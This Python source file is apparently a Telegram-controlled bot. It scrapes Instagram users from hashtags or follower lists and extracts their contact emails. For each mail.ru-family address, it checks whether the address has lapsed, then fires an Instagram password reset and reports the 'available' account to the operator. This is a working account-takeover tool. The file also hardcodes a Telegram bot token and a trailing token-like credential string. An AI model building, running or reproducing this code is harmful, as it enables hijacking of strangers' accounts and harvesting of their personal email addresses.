import time
import threading
import logging
import requests
from instagram_api import InstagramAPI
from telegram_bot import TelegramBot
from mail_ru_checker import MailRuChecker
BOT_TOKEN = "8229341966:AAGNmb-ww70Fe4xo3QA5vtkWN0sMRqhJGOQ" 
logging.basicConfig(
    filename='app.log', 
    level=logging.INFO, 
    format='%(asctime)s %(levelname)s: %(message)s')
class AppState:
    IDLE = 0
    WAITING_SESSION = 1
    WAITING_TARGET = 2
    WAITING_PAGINATION = 4 # New State
    RUNNING = 3
class MainApp:
    def __init__(self):
        self.BOT_TOKEN = BOT_TOKEN
        self.telegram = TelegramBot(self.BOT_TOKEN) 
        self.mail_checker = MailRuChecker() 
        self.api = None 
        self.state = AppState.IDLE
        self.session_id = None
        self.target = None
        self.stop_event = threading.Event()
        self.job_thread = None
        self.resume_max_id = None # New
        self.resume_rank_token = None # New
        self.stats = {
            "scanned": 0,
            "available": 0,
            "taken": 0,
            "non_mailru": 0,
            "private_no_email": 0,
            "errors": 0}
        self.stats_message_id = None
        self.setup_handlers()
    def setup_handlers(self):
        @self.telegram.bot.message_handler(commands=['start'])
        def handle_start(message):
            self.telegram.chat_id = message.chat.id
            if self.state == AppState.RUNNING:
                self.stop_event.set()
                if self.job_thread: 
                    self.job_thread.join()
                self.telegram.bot.send_message(message.chat.id, "Job stopped.")
            self.state = AppState.WAITING_SESSION
            self.session_id = None
            self.target = None
            self.stop_event.clear()
            self.telegram.bot.send_message(message.chat.id, "Welcome! Please send your Instagram **Session ID**.")
        @self.telegram.bot.message_handler(func=lambda m: True)
        def handle_text(message):
            self.telegram.chat_id = message.chat.id
            text = message.text.strip()
            chat_id = message.chat.id
            if self.state == AppState.WAITING_SESSION:
                logging.info(f"Received Session ID: {text}")
                self.session_id = text
                try:
                    self.api = InstagramAPI(self.session_id)
                    self.state = AppState.WAITING_TARGET
                    self.telegram.bot.send_message(chat_id, "Session ID Saved.\nNow send the **Hashtag** (e.g., #cars) or **Username** (@user) to scrape.")
                    return
                except Exception as e:
                    self.telegram.bot.send_message(chat_id, f"Error initializing API: {e}")
                    return
            elif self.state == AppState.WAITING_TARGET:
                self.target = text
                if self.target == self.session_id:
                    return
                
                self.state = AppState.WAITING_PAGINATION
                self.telegram.bot.send_message(chat_id, "Target Accepted.\n\n🔄 **Resume Job?**\nSend the **MaxID** (and **RankToken** for hashtags) to resume.\nFormat: `max_id` OR `max_id|rank_token`\n\nSend **'none'** or **'null'** to start from the beginning.")

            elif self.state == AppState.WAITING_PAGINATION:
                text_lower = text.lower()
                self.resume_max_id = None
                self.resume_rank_token = None
                
                if text_lower not in ['none', 'null', 'no']:
                    is_follower = self.target.startswith("@")
                    
                    if is_follower:
                        # Followers MaxID often contains '|', so take the whole text
                        self.resume_max_id = text.strip()
                    else:
                        # Hashtags might need RankToken separated by '|'
                        # Assuming Hashtag MaxID doesn't contain '|' usually, or user knows format
                        parts = text.split("|")
                        self.resume_max_id = parts[0].strip()
                        if len(parts) > 1:
                            self.resume_rank_token = parts[1].strip()
                            
                    self.telegram.bot.send_message(chat_id, f"Resuming from MaxID: {self.resume_max_id}")
                else:
                    self.telegram.bot.send_message(chat_id, "Starting fresh job...")

                self.state = AppState.RUNNING
                self.stop_event.clear()
                self.job_thread = threading.Thread(target=self.process_job, args=(chat_id,))
                self.job_thread.start()
            elif self.state == AppState.RUNNING:
                if text.lower() == "/stop":
                    self.stop_event.set()
                    self.telegram.bot.send_message(chat_id, "Stopping job...")
                else:
                    self.telegram.bot.send_message(chat_id, "Job is running. Send /stop to stop or /start to restart.")
    def format_stats(self):
        return (
            f"📊 **Live Stats**\n"
            f"target: {self.target}\n"
            f"📍 MaxID: `{self.stats.get('max_id', 'Init')}`\n"
            f"----------------------\n"
            f"🔍 Scanned: {self.stats['scanned']}\n"
            f"✅ Available: {self.stats['available']}\n"
            f"❌ Taken: {self.stats['taken']}\n"
            f"⚠️ Non-MailRu: {self.stats['non_mailru']}\n"
            f"🔒 Pvt/No Email: {self.stats['private_no_email']}\n"
            f"⚠️ API Errors: {self.stats['errors']}")
    def process_job(self, chat_id):
        self.stats = {k: 0 for k in self.stats}
        self.stats['max_id'] = self.resume_max_id if self.resume_max_id else "Start"
        
        stats_msg_id = self.telegram.bot.send_message(chat_id, self.format_stats())
        self.stats_message_id = stats_msg_id.message_id     
        mode = "HASHTAG" if self.target.startswith("#") else "FOLLOWER"
        if not self.target.startswith("#") and not self.target.startswith("@"):
            if " " not in self.target:
                mode = "HASHTAG"        
        target_id = None
        if self.target.startswith("@"):
            mode = "FOLLOWER"
            username = self.target.lstrip("@")
            target_id = self.api.resolve_username(username)
            if not target_id:
                self.telegram.bot.send_message(chat_id, f"Could not resolve username {username}")
                return
        logging.info(f"Starting Job: {mode} on {self.target}")
        
        # Resume Logic
        next_max_id = self.resume_max_id
        rank_token = self.resume_rank_token
        
        while not self.stop_event.is_set():
            users = []
            try:
                if mode == "HASHTAG":
                    users, next_max_id, rank_token = self.api.get_hashtag_posts(self.target, next_max_id, rank_token)
                else:
                    users, next_max_id = self.api.get_user_followers(target_id, next_max_id)
                
                # Update Stats with new Max ID
                self.stats['max_id'] = next_max_id
                
                if not users and not next_max_id:
                    logging.info("No users found or end of list.")
                    self.telegram.bot.send_message(chat_id, "Job Finished (No more users).")
                    break
                for user in users:
                    if self.stop_event.is_set(): break                
                    self.process_single_user(chat_id, user)
                    self.telegram.edit_message(chat_id, self.stats_message_id, self.format_stats())
                    if self.stats["errors"] >= 30:
                        self.stop_event.set()
                        self.telegram.bot.send_message(chat_id, "🚨 Job Stopped: Too many API errors (30+).")
                        break
                    time.sleep(1)
                if not next_max_id:
                    self.telegram.bot.send_message(chat_id, "Job Finished (End of Pagination).")
                    break
                time.sleep(2)
            except Exception as e:
                 logging.error(f"Job Critical Error: {e}")
                 self.telegram.bot.send_message(chat_id, f"Error in loop: {e}")
                 break
        self.state = AppState.IDLE
        self.telegram.bot.send_message(chat_id, "Job Complete.")
    def process_single_user(self, chat_id, user):
        user_id = user["id"]
        username = user["username"]
        email, error = self.api.get_user_info(user_id)        
        self.stats["scanned"] += 1
        if error:
            self.stats["errors"] += 1
            logging.warning(f"Error fetching {username}: {error}")
            return
        if not email:
            self.stats["private_no_email"] += 1
            return
        logging.info(f"Checking {username}: {email}")
        domain = email.split("@")[-1].lower()
        if "mail.ru" not in domain and "bk.ru" not in domain and "inbox.ru" not in domain and "list.ru" not in domain and "internet.ru" not in domain:
            self.stats["non_mailru"] += 1
            return
        is_taken = self.mail_checker.check(email)
        if is_taken:
            self.stats["taken"] += 1
        else:
            self.stats["available"] += 1
            
            # Send Reset Password Request
            reset_msg = self.api.send_password_reset(username)
            
            msg = (
                f"✅ **FOUND AVAILABLE**\n"
                f"User: @{username}\n"
                f"Email: `{email}`\n"
                f"Link: https://instagram.com/{username}\n"
                f"ℹ️ {reset_msg}"
            )
            self.telegram.bot.send_message(chat_id, msg)
            logging.info(f"FOUND: {email} (@{username}) | {reset_msg}")
    def format_stats(self):
        return (
            f"📊 **Scrape Status: {self.target}**\n"
            f"---------------------------\n"
            f"🔍 Scanned: {self.stats['scanned']}\n"
            f"✅ Available: {self.stats['available']}\n"
            f"❌ Taken: {self.stats['taken']}\n"
            f"📧 Non-MailRu: {self.stats['non_mailru']}\n"
            f"👻 No Email: {self.stats['private_no_email']}\n"
            f"⚠️ API Errors: {self.stats['errors']}\n")
def check_license():
    logging.info("Checking license...")
    try:
        PASTEBIN_URL = "https://gist.githubusercontent.com/Mohamed-TBAG/a50872f06daf27bdbd324bb72205c8a4/raw/24c3d6d1f48a8d56c4d34e001d191fe7b96a222f/gistfile1.txt"      
        response = requests.get(PASTEBIN_URL, timeout=15)
        if response.status_code == 200:
            if "mohamedoscar" in response.text:
                logging.info("License Verified! ✅")
                return True
            else:
                logging.error("License Invalid or Expired.")
                return False
    except Exception as e:
        logging.error(f"License check failed: {e}")
    return False
if __name__ == "__main__":
    if check_license():
        app = MainApp()
        logging.error("Bot is polling...")
        try:
            app.telegram.bot.infinity_polling()
        except KeyboardInterrupt:
            app.stop_event.set()
            logging.error("Stopped.")
    else:
        logging.error("\n❌ License Invalid or Expired.")
        logging.error("Please contact the developer to activate this software.")
        input("\nPress Enter to exit...")
        "80062757476:l7IHH3QyCQWXZk:0:AYhBDcEaxaO_HEoi9ilZEnslz0kC7bWMxVpglT3tHw"